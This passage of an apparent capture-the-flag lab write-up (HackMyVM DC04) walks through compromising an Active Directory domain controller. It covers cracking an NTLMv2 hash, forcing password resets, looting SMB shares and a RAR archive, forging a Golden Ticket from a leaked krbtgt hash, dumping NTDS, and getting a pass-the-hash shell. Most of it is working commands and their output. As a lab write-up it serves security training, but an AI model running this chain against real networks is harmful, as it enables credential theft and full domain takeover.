┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ cat hash            
websvc::soupedecode:6da21140dcdb415f:A771FCCD76FFCD8BA1FF3807BBCF9820:010100000000000000BCD7E3DE4CDD01FF2E06D63C1E87A300000000020008003700520044005A0001001E00570049004E002D003400540053004400470057005300410047004300530004003400570049004E002D00340054005300440047005700530041004700430053002E003700520044005A002E004C004F00430041004C00030014003700520044005A002E004C004F00430041004C00050014003700520044005A002E004C004F00430041004C000700080000BCD7E3DE4CDD010600040002000000080030003000000000000000000000000040000088EB3C2287D9297424FB9AB6B215CD064BD0178A8D7C95D5E1752F2E4758BF460A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0032002E0033000000000000000000
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ john hash          
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
jordan23         (websvc)     
1g 0:00:00:00 DONE 2/3 (2026-09-25 11:17) 11.11g/s 104188p/s 104188c/s 104188C/s 123456..Peter
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
John burns through its standard wordlist in less than a second and pops the cleartext password: `jordan23`.
We immediately attempt to validate these credentials across the SMB layer using `NetExec` to map out our network privileges.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'websvc' -p 'jordan23' --shares
SMB         10.0.2.28       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.28       445    DC01             [-] SOUPEDECODE.LOCAL\websvc:jordan23 STATUS_PASSWORD_EXPIRED 
```
The authentication hits a speed bump: `STATUS_PASSWORD_EXPIRED`. The credentials are valid, but Active Directory is forcing a mandatory password change before letting the account interact with the domain. Fortunately, NetExec has a built in module precisely for this scenario. We can leverage the change password module to remotely push a fresh password through the SMB protocol without needing an interactive desktop.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'websvc' -p 'jordan23' -M change-password -o NEWPASS='Password123'
SMB         10.0.2.28       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.28       445    DC01             [-] SOUPEDECODE.LOCAL\websvc:jordan23 STATUS_PASSWORD_EXPIRED 
CHANGE-P... 10.0.2.28       445    DC01             [+] Successfully changed password for websvc
```
The password updates seamlessly. We execute another SMB authentication sweep using our newly defined credential, `Password123`, to check our access scope.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'websvc' -p 'Password123' --shares                        
SMB         10.0.2.28       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.28       445    DC01             [+] SOUPEDECODE.LOCAL\websvc:Password123 
SMB         10.0.2.28       445    DC01             [*] Enumerated shares
SMB         10.0.2.28       445    DC01             Share           Permissions     Remark
SMB         10.0.2.28       445    DC01             -----           -----------     ------
SMB         10.0.2.28       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.28       445    DC01             C               READ            
SMB         10.0.2.28       445    DC01             C$                              Default share
SMB         10.0.2.28       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.28       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.28       445    DC01             SYSVOL          READ            Logon server share 
```
Success! The server returns a clean `[+]` status, confirming we have established our first official footheld inside the Active Directory environment.
Even better, our permissions check reveals we have `READ` access across several shares, including a non standard custom share named `C`. This share likely maps to the root file system or a dedicated deployment folder, giving us a perfect target to start hunting for configuration files, scripts, or sensitive internal data.

With our authenticated session working, we use `smbclient` to explore the non-standard custom share named `C`. This share maps directly to the root file system of the Domain Controller. 
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ smbclient //$ip/C -U 'websvc'
Password for [WORKGROUP\websvc]:
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sat Jun 15 21:19:51 2024
  Documents and Settings          DHSrn        0  Sun Jun 16 04:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Fri Sep 25 20:16:10 2026
  pagefile.sys                      AHS 1476395008  Fri Sep 25 20:16:10 2026
  PerfLogs                            D        0  Sat May  8 10:15:05 2021
  Program Files                      DR        0  Sat Jun 15 19:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 11:34:13 2021
  ProgramData                       DHn        0  Tue Nov  5 22:44:31 2024
  Recovery                         DHSn        0  Sun Jun 16 04:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 21:02:21 2024
  Users                              DR        0  Thu Nov  7 02:55:53 2024
  Windows                             D        0  Thu Nov  7 23:32:13 2024
  xampp                               D        0  Tue Nov  5 23:56:28 2024

                12942591 blocks of size 4096. 10558228 blocks available
smb: \> 
```
Navigating into the `Users` directory immediately leaks the profile folders of several custom active domain accounts.
```bash
smb: \> cd users\
smb: \users\> dir
  .                                  DR        0  Thu Nov  7 02:55:53 2024
  ..                                DHS        0  Wed Nov  6 00:30:29 2024
  Administrator                       D        0  Sat Jun 15 21:56:40 2024
  All Users                       DHSrn        0  Sat May  8 10:26:16 2021
  Default                           DHR        0  Sun Jun 16 04:51:08 2024
  Default User                    DHSrn        0  Sat May  8 10:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 10:14:03 2021
  fjudy998                            D        0  Thu Nov  7 02:55:33 2024
  ojake987                            D        0  Thu Nov  7 02:55:16 2024
  Public                             DR        0  Sat Jun 15 19:54:32 2024
  rtina979                            D        0  Thu Nov  7 02:54:39 2024
  websvc                              D        0  Thu Nov  7 02:44:11 2024
  xursula991                          D        0  Thu Nov  7 02:55:28 2024

                12942591 blocks of size 4096. 10558212 blocks available
smb: \users\> 
```
There are a few user directories shown in this folder.
- fjudy998
- ojake987
- rtina979
- xursula991

We have to save those to a file.

```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ cat users-identified.txt 
fjudy998
ojake987
rtina979
xursula991
```
Now we have a solid target list. We leverage our `websvc` privileges to dump the complete Active Directory user data bank from the Domain Controller using `NetExec` and save it directly to `AD_users.txt`:
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb $ip -u 'websvc' -p 'Password123' --users > AD_users.txt
```
This raw dump contains a massive amount of output. To filter through the noise and match it against our newly identified users, we run `grep` using the `-w` (word match) and `-f` (file input) flags to quickly isolate our targets.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ grep -w -f users-identified.txt AD_users.txt
SMB                      10.0.2.28       445    DC01             rtina979                      2024-11-07 01:53:17 0       Default Password Z~l3JhcV#7Q-1#M 
SMB                      10.0.2.28       445    DC01             ojake987                      2024-06-15 20:05:25 0       Tech geek and gadget collector 
SMB                      10.0.2.28       445    DC01             xursula991                    2024-06-15 20:05:26 0       Yoga practitioner and meditation lover 
SMB                      10.0.2.28       445    DC01             fjudy998                      2024-06-15 20:05:26 0       Music lover and aspiring guitarist 
```
The filter pays off instantly. The Active Directory user description fields are leaked, dropping a cleartext password payload right into our lap for the user **`rtina979`**: `Default Password Z~l3JhcV#7Q-1#M`.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'rtina979' -p 'Z~l3JhcV#7Q-1#M' --shares

┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'rtina979' -p 'Z~l3JhcV#7Q-1#M' -M change-password -o NEWPASS='Password123'
SMB         10.0.2.28       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.28       445    DC01             [-] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M STATUS_PASSWORD_EXPIRED 
CHANGE-P... 10.0.2.28       445    DC01             [+] Successfully changed password for rtina979
```
As expected, the default password hits another **`STATUS_PASSWORD_EXPIRED`** barrier. We feed it right back into the `change-password` module, updating the target's credentials to our standard lab convention: `Password123`.

With the password updated, we run our validation check to map out the execution scope:
```bash                                                                                                           
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'rtina979' -p 'Z~l3JhcV#7Q-1#M' --shares                                   
SMB         10.0.2.28       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.28       445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M 
SMB         10.0.2.28       445    DC01             [*] Enumerated shares
SMB         10.0.2.28       445    DC01             Share           Permissions     Remark
SMB         10.0.2.28       445    DC01             -----           -----------     ------
SMB         10.0.2.28       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.28       445    DC01             C               READ            
SMB         10.0.2.28       445    DC01             C$                              Default share
SMB         10.0.2.28       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.28       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.28       445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                 
```
The access is confirmed. We now have complete domain user access with `rtina979`. Our foothold is expanding, and we are tracking multiple parallel avenues of initial compromise across the directory structure.

Armed with the updated credentials for rtina979, we establish a fresh authenticated session via smbclient to pillage the user's home folder.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ smbclient //$ip/C -U 'rtina979'                
Password for [WORKGROUP\rtina979]:
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sat Jun 15 21:19:51 2024
  Documents and Settings          DHSrn        0  Sun Jun 16 04:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Fri Sep 25 20:16:10 2026
  pagefile.sys                      AHS 1476395008  Fri Sep 25 20:16:10 2026
  PerfLogs                            D        0  Sat May  8 10:15:05 2021
  Program Files                      DR        0  Sat Jun 15 19:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 11:34:13 2021
  ProgramData                       DHn        0  Tue Nov  5 22:44:31 2024
  Recovery                         DHSn        0  Sun Jun 16 04:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 21:02:21 2024
  Users                              DR        0  Thu Nov  7 02:55:53 2024
  Windows                             D        0  Thu Nov  7 23:32:13 2024
  xampp                               D        0  Tue Nov  5 23:56:28 2024

                12942591 blocks of size 4096. 10554203 blocks available
smb: \> cd users\rtina979\
smb: \users\rtina979\> ls
  .                                   D        0  Thu Nov  7 02:54:39 2024
  ..                                 DR        0  Thu Nov  7 02:55:53 2024
  AppData                            DH        0  Thu Nov  7 02:54:39 2024
  Application Data                DHSrn        0  Thu Nov  7 02:54:39 2024
  Cookies                         DHSrn        0  Thu Nov  7 02:54:39 2024
  Desktop                            DR        0  Sat May  8 10:15:05 2021
  Documents                          DR        0  Thu Nov  7 23:35:52 2024
  Downloads                          DR        0  Sat May  8 10:15:05 2021
  Favorites                          DR        0  Sat May  8 10:15:05 2021
  Links                              DR        0  Sat May  8 10:15:05 2021
  Local Settings                  DHSrn        0  Thu Nov  7 02:54:39 2024
  Music                              DR        0  Sat May  8 10:15:05 2021
  My Documents                    DHSrn        0  Thu Nov  7 02:54:39 2024
  NetHood                         DHSrn        0  Thu Nov  7 02:54:39 2024
  NTUSER.DAT                        AHn   131072  Fri Sep 25 20:16:58 2026
  ntuser.dat.LOG1                   AHS    90112  Thu Nov  7 02:54:39 2024
  ntuser.dat.LOG2                   AHS        0  Thu Nov  7 02:54:39 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Thu Nov  7 02:54:45 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Thu Nov  7 02:54:39 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Thu Nov  7 02:54:39 2024
  ntuser.ini                        AHS       20  Thu Nov  7 02:54:39 2024
  Pictures                           DR        0  Sat May  8 10:15:05 2021
  Recent                          DHSrn        0  Thu Nov  7 02:54:39 2024
  Saved Games                        Dn        0  Sat May  8 10:15:05 2021
  SendTo                          DHSrn        0  Thu Nov  7 02:54:39 2024
  Start Menu                      DHSrn        0  Thu Nov  7 02:54:39 2024
  Templates                       DHSrn        0  Thu Nov  7 02:54:39 2024
  Videos                             DR        0  Sat May  8 10:15:05 2021

                12942591 blocks of size 4096. 10554203 blocks available
smb: \users\rtina979\> cd Documents\
smb: \users\rtina979\Documents\> ls
  .                                  DR        0  Thu Nov  7 23:35:52 2024
  ..                                  D        0  Thu Nov  7 02:54:39 2024
  My Music                        DHSrn        0  Thu Nov  7 02:54:39 2024
  My Pictures                     DHSrn        0  Thu Nov  7 02:54:39 2024
  My Videos                       DHSrn        0  Thu Nov  7 02:54:39 2024
  Report.rar                          A   712046  Thu Nov  7 14:35:49 2024

                12942591 blocks of size 4096. 10554203 blocks available
```
Deep inside the Documents directory, we stumble upon a classic piece of forensic loot: `Report.rar`. This is a solid indicator of sensitive or protected operational data. We pull the archive back to our Kali machine for analysis.
```bash
smb: \users\rtina979\Documents\> get Report.rar
getting file \users\rtina979\Documents\Report.rar of size 712046 as Report.rar (6817.2 KiloBytes/sec) (average 6817.2 KiloBytes/sec)
smb: \users\rtina979\Documents\> 
```

Back in our workspace, trying to unpack the .rar file reveals it is locked behind encryption. To crack it, we use rar2john to ingest the archive structure and extract the password hash into a format that our offline tools can process:

```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ ll

total 868
-rw-rw-r-- 1 emvee emvee    687 Sep 25 11:17 hash
-rw-r--r-- 1 emvee emvee 712046 Sep 25 12:27 Report.rar
-rw-rw-r-- 1 emvee emvee  10459 Sep 25 11:02 unique_passwords.txt
-rw-rw-r-- 1 emvee emvee     38 Sep 25 11:27 users-identified.txt
-rw-rw-r-- 1 emvee emvee 155155 Sep 25 11:24 AD_users.txt
                                                                                                           
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ rar2john Report.rar > rarhash
                                                                                                           
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ john rarhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD123      (Report.rar)     
1g 0:00:01:07 DONE (2026-09-25 12:31) 0.01487g/s 765.6p/s 765.6c/s 765.6C/s chitra..2pac4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We point John the Ripper to our extracted rarhash and fire it against the classic `rockyou.txt` dictionary. Because RAR5 encryption uses modern PBKDF2-SHA256 derivation with thousands of iterations, the cracking speed drops significantly to around ~765 guesses per second.

But after just 67 seconds of processing, John cracks the archive wide open with the plaintext password: `PASSWORD123`.
Now we should extract the archive to inspect the content.

```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ unrar x Report.rar          

UNRAR 7.20 freeware      Copyright (c) 1993-2026 Alexander Roshal

Enter password (will not be echoed) for Report.rar: 

The specified password is incorrect.
Enter password (will not be echoed) for Report.rar: 

Extracting from Report.rar

Extracting  Pentest Report.htm                                        OK 
Creating    Pentest Report_files                                      OK
Extracting  Pentest Report_files/m2-unbound-source-serif-pro.css      OK 
Extracting  Pentest Report_files/main-branding-base.W9J-2zkF03j8TkriAGn1Tg.12.css  OK 
Extracting  Pentest Report_files/dart.min.js                          OK 
Extracting  Pentest Report_files/google-analytics_analytics.js        OK 
Extracting  Pentest Report_files/highlight.min.js                     OK 
Extracting  Pentest Report_files/main-base.bundle.IcW7tD43-xaHoBj2_P6wLQ.12.js  OK 
Extracting  Pentest Report_files/main-common-async.bundle.SkTeOM8g4JVEInYAgrgW9Q.12.js  OK 
Extracting  Pentest Report_files/main-notes.bundle.qVLVB-ghGjYQMo6npDHNjw.12.js  OK 
Extracting  Pentest Report_files/main-posters.bundle.JMIo8YhZ0NhbVObiML4nWQ.12.js  OK 
All OK
```
The unpack finishes cleanly, dropping a highly sensitive artifact right into our workspace: `Pentest Report.htm` along with its complete structural assets directory.

## Privilege escalation
Stumbling upon a full corporate penetration testing report while inside a Domain Controller is an absolute goldmine. This document is essentially a pre compiled roadmap of the target network. It likely details legacy systemic flaws, active service account identities, unpatched internal assets, or leftover developer configurations that the enterprise hasn't remediated yet.

To read through the findings and harvest the next stage of our attack map, we fire up a local background instance of Firefox to inspect the HTML report visually.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ firefox Pentest\ Report.htm & 
[1] 6045
```

Let's read the report in  Firefox.
![image](/assets/img/WriteUp/HackMyVM/DC04/18.png){: width="700" height="400" }
Reading through the extracted Pentest `Report.htm` reveals a devastating sequence of historical compromises. The previous assessment documentation explicitly states that they obtained Remote Code Execution (RCE) using `impacket-psexec` via a compromised machine account (`FileServer$`) and extracted a partial dump of the Active Directory database (`NTDS.dit`).The leaked report displays a critical list of domain account hashes, including a highly sensitive entry `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f55cdc40bd8f5814587f7e6b2f85e6f:::`

Finding an NTDS database dump sample containing the `krbtgt` account hash alters our operational strategy entirely.
- The Power of the `krbtgt` Account: In an Active Directory environment, the `krbtgt` (Kerberos Key Distribution Center Service Account) is the single most critical account. It is responsible for encrypting and signing all Kerberos Ticket Granting Tickets (TGT) across the entire forest.
- Golden Ticket Potential: Because we have recovered the NThash of `krbtgt` (`0f55cdc40bd8f5814587f7e6b2f85e6f`), we possess the cryptographic key required to forge our own Kerberos authentication tokens. This enables a Golden Ticket Attack. With a forged Golden Ticket, we can impersonate any domain user (including enterprise administrators) and grant ourselves infinite persistence, bypassing password changes entirely.
- The Password Spraying Alternative: Along with the `krbtgt` hash, the report leaves behind an expansive listing of valid Active Directory usernames (such as bmark0, otara1, kleo2) paired with their NTLM hashes. We can extract these names to build a definitive target user dictionary or try to crack the user hashes offline to discover the organization's baseline password complexity habits.

Using our credentials for rtina979, we run `impacket-lookupsid`.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ impacket-lookupsid soupedecode.local/rtina979:'Password123'@$ip > sids.txt                
                                                                                                          
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ head sids.txt                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.0.2.28
[*] StringBinding ncacn_np:10.0.2.28[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)

```
We found exactly what we came for: the official Domain SID (`S-1-5-21-2986980474-46765180-2505414164`).
Now, remember that massive 10-hour clock skew Nmap flagged earlier? Before we can forge Kerberos tickets, our attacker clock must perfectly align with the Domain Controller (within a strict 5-minute window). We turn off automatic network time protocol mapping and forcefully synchronize our Kali clock against the DC using ntpdate.

```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ sudo timedatectl set-ntp false                  
[sudo] password for emvee: 
                                                                                      
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ sudo ntpdate DC01.SOUPEDECODE.LOCAL                       
2026-09-27 06:44:57.110715 (+0200) +0.466922 +/- 0.001389 DC01.SOUPEDECODE.LOCAL 10.0.2.28 s1 no-leap
```
Our time is synced. Now we can proceed our attack.

Even though the krbtgt account is disabled for direct SMB logins, its cryptographic key is still valid for token signing. Armed with the krbtgt NThash from the leaked pentest report and our newly extracted Domain SID, we unleash `impacket-tickete`r to forge a Golden Ticket for the built in Administrator identity.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ impacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain soupedecode.local  administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for soupedecode.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```
The tool successfully crafts `administrator.ccache`. We inject this forged Kerberos ticket straight into our terminal session's memory environment.
```bash                                                                          
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ export KRB5CCNAME=administrator.ccache   
```
With our ticket cache loaded, we bypass standard credential requirements completely. We run NetExec over SMB with the `--use-kcache` flag, ordering the Domain Controller to validate our forged ticket and grant us direct extraction access to the entire `NTDS.dit` database
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nxc smb $ip -u administrator --use-kcache --ntds | grep -i "administrator:"    
SMB                      10.0.2.28       445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:536a1787e6c4261388493937fcd0f444:::
```
Boom! The DC trusts our forged identity completely and dumps the live, active NT hash for the administrator `536a1787e6c4261388493937fcd0f444`.

With the real Administrator hash secured, we execute our final Pass the Hash connection via `evil-winrm` to grab an interactive administrative PowerShell console.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ evil-winrm -u administrator -H 536a1787e6c4261388493937fcd0f444 -i 10.0.2.28
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
The shell hooks perfectly, dropping us straight into the environment with administrative privileges. We execute a few commands like you should do for your OSCP exam to take a screenshot for your report.
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname;ipconfig;type C:\Users\Administrator\desktop\root.txt;type C:\Users\websvc\Desktop\user.txt
soupedecode\administrator
DC01

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::b986:db13:9ad5:821%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.28
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1
HERE IS THE ROOT FLAG
HERE IS THE USER FLAG
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

## Final thoughts and conclussion
From analyzing an unexpected Apache, PHP website on a Windows Domain Controller, to capturing service account hashes, abusing expired fallback password requirements, and looting a leaked penetration testing report, we successfully achieved Domain Admin compromise on DC04.